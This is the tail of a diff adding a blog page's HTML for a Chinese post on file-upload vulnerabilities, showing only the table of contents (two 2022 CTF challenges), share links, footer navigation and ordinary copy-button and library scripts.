+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-file-master"><span class="toc-number">1.2.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]file_master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">1.3.</span> <span class="toc-text">[鹏城杯 2022]压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&text=文件上传"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&is_video=false&description=文件上传"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=文件上传&body=Check out this article: https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&name=文件上传&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&t=文件上传"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    jxdgx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<script src="/js/custom.js"></script>
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
